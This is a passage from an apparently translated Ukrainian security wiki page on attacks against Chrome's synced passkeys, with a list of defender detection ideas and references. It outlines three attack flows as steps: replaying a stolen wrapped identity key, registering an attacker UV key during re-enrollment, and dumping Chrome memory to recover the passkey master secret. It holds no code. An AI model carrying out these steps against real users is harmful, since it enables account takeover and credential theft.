1. **Pass-ta-key / ретрансляція ідентифікатора пристрою**<sup>[[4]](#references)</sup>
   - Перелічити `WebauthnCredentialSpecifics` у LevelDB Chrome.
   - Розпочати вхід за допомогою passkey й отримати новий виклик WebAuthn.
   - Використати викрадений blob `wrapped_identity_private_key` на TPM жертви, щоб підписати прив’язку запиту cloud-authenticator.
   - Передати отриманий assertion стороні, що покладається на автентифікацію.
   - Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertions із **`UV=0`**.
2. **Перехоплення ключа UV в очікуванні**<sup>[[4]](#references)</sup>
   - Примусово запустити повторне налаштування, видаливши `passkey_enclave_state` або надіславши коректну підписану операцію `device/forget`.
   - Якщо після налаштування пристрій перебуває у стані **`uv_key_pending`**, зареєструвати контрольований зловмисником відкритий ключ UV.
   - Якщо провайдер не перевіряє attestation / походження нового ключа UV із захищеного апаратного забезпечення, подальші підписи ключем зловмисника вважатимуться такими, що мають **`UV=1`**.
3. **Викрадення master secret / відновлення SDS**<sup>[[4]](#references)</sup>
   - Примусово запустити відновлення або повторне приєднання, щоб Chrome отримав master secret синхронізованих passkey.
   - Стежити за повторним створенням або зміною `passkey_enclave_state`, а потім зняти дамп пам’яті Chrome, поки відкритий текст **секрету домену безпеки (SDS)** перебуває в пам’яті.
   - Використати відновлений SDS, щоб розшифрувати зашифровані поля в кожному записі `WebauthnCredentialSpecifics` і відновити переносні приватні ключі WebAuthn.

### DFIR / ідеї для виявлення

- Відстежувати **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Створювати сповіщення про аномальний доступ до Chrome **`Sync Data\LevelDB`** з боку процесів, що не є браузерами.
- Створювати сповіщення про **дампи пам’яті Chrome** або підозрілий доступ до пам’яті інших процесів.
- Розслідувати повторні запити **PIN-коду для відновлення Google Password Manager** або несподіване повторне налаштування.
- Пам’ятайте, що WebAuthn **`signCount`** часто не є корисним для синхронізованих passkey, оскільки може залишатися незмінним, тому класичне виявлення клонів малоефективне.

## References

- [1] [Unit 42 – Розслідування багаторічних непомічених операцій, націлених на важливі сектори](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA і SMTP → розшифрування облікових даних hMailServer → CVE-2023-27532 у Veeam для отримання SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Усередині Ink Dragon: розкриття мережі ретрансляції та внутрішніх механізмів прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова поверхня атаки в автентифікації без пароля](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / сховище ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Злам Windows: атаки на системи та мережі Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: усередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – віддалене отримання дампу паролів Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho розширює арсенал кібершпигунства за допомогою інструментарію Still](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – функція CreateFileW і `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – режим резервного копіювання Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – завершення активних сеансів](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard і Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: захист облікових даних і керування ними](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
- [16] [S12 DumpNTDS.cpp](https://github.com/S12cybersecurity/HandleRedirect/blob/main/DumpNTDS/DumpNTDS/DumpNTDS.cpp)
- [17] [VMkatz – підтримувані вхідні дані та короткий посібник](https://github.com/nikaiw/VMkatz)
- [18] [0xdf – HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
